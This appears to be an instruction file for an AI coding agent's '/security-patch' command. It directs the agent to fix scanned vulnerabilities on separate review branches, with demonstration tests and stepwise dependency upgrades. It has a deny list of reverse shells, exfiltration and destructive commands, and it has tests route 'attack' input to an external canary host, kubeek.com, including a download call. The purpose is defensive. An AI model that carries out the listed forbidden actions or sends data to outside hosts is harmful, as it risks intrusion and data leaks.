---
description: Implement the remediation plan from /security-eval - one review branch per patch group, each demonstrating the fix. Direct-dependency CVEs are bumped iteratively with code migration and tests. Strictly no real exploit code.
argument-hint: "[group id(s) | 'all'] (default: all groups in the plan)"
---

# /security-patch

Turn the grouped remediation plan into **one review branch per patch group**, so
a developer reviews each as a self-contained PR.

## Input
Read `reports/remediation-plan.json` (produced by `/security-eval`). If it is
missing, run `/security-eval` first. `$ARGUMENTS` selects which group ids to
patch (default: **all**).

## ⛔ Safety contract - READ FIRST, non-negotiable
The goal is to **fix** vulnerabilities and **demonstrate** the fix - never to
weaponize them. In any patch, test or demonstration the ONLY side effects you
may produce are these two inert canaries:

1. **Create a `.txt` file named after the branch** - e.g. write
   `<branch>.demo.txt` whose contents are the branch name; or
2. **Call a controlled `kubeek.com` canary endpoint** - and ONLY one of the
   endpoints documented in [`../canary-endpoints.md`](../canary-endpoints.md),
   via the canary helper (`canary.sh` / `canary.ps1` / `canary.py` - pick the
   form for this OS, see [`../scripts/README.md`](../scripts/README.md)). These
   are inert, owner-operated endpoints that exist to validate
   drop/exfiltration/info-collection paths; they run nothing harmful. Never
   contact any other external host.

STRICTLY FORBIDDEN - never write, run, or commit any of:
- real exploit payloads, reverse shells, or data/credential exfiltration to any
  host other than the `kubeek.com` canary endpoints above;
- destructive or state-changing commands: `rm` / `rmdir`, `mv` or overwrite of
  real files, `chmod`, `kill`, dropping DB tables, writing outside the repo;
- real secrets, or any change outside the current patch branch's scope.

A demonstration proves the *behavior* (reachable before, safe after) using only
(1) or (2). If you cannot demonstrate something without a real exploit, describe
it in prose instead - do not implement the exploit.

## Per-group procedure
For each selected group, starting from a clean working tree on the default branch:

1. **Branch** - `git switch -c <group.branch>` (one branch per group; never mix
   concerns).

2. **Code fix** (`kind` = `code` / `config`) - apply the remediation at the single
   best `fix_location` from the plan; prefer a shared sanitizer/helper over
   editing every sink. Keep the diff minimal and focused on this one concern.

3. **Demonstration** - add a small test (under `tests/`, or the project's test
   dir) that shows the path is now safe, using ONLY a safe canary:
   - route the "attack" input at a `kubeek.com` canary endpoint via the canary
     helper (`canary.sh`/`.ps1`/`.py`, e.g. `canary monip` / `canary download
     run.sh`) - assert the unfixed path would have reached it and the fixed path
     no longer does / sanitizes the input; **or**
   - assert success by the presence/absence of the `<branch>.demo.txt` marker.
   The test must pass on the fixed code and would have tripped the canary on the
   unfixed code. See [`../canary-endpoints.md`](../canary-endpoints.md) for the
   full endpoint list. **Never run a real payload.**

4. **Dependency bump** (`kind` = `dependency`) - do it **iteratively, one commit
   per step**, so the migration is reviewable:
   a. *commit 1* - bump the direct dependency in the manifest
      (`deps/requirements.txt` / `deps/package.json`) from `current` → `target`.
   b. *commit 2* - **migrate the code** that breaks under the new version: grep
      the repo for usages of the package and adapt to renamed/removed APIs,
      changed signatures or defaults.
   c. *commit 3* - **add the missing tests** that pin the prior behavior, so the
      bump is proven non-breaking; run them and confirm green. Add tests for any
      behavior that had none.
   If a safe target needs intermediate versions, hop version-by-version, each
   with its own migrate + test commits.

5. **Commit** the fix + demo with a clear message
   (`fix(security): <group title>`), then switch back to the default branch for
   the next group.

6. Leave each branch **for review** - do **not** merge. Push or open a PR only if
   the user explicitly asks; otherwise the local branches are ready for the
   developer to review and turn into PRs.

## Secrets groups
Never commit a "fix" that re-embeds the secret. The patch: remove the literal,
read it from the environment / a secret manager, and **note the leaked
credential must be rotated**. Demonstrate by asserting the code reads the value
from the environment (with a dummy value) - no literal secret in the diff.

## Output
A short report - per group: branch name, files changed, the demonstration used,
and (for dependency bumps) the version delta + tests added - followed by the list
of branches the developer should review.
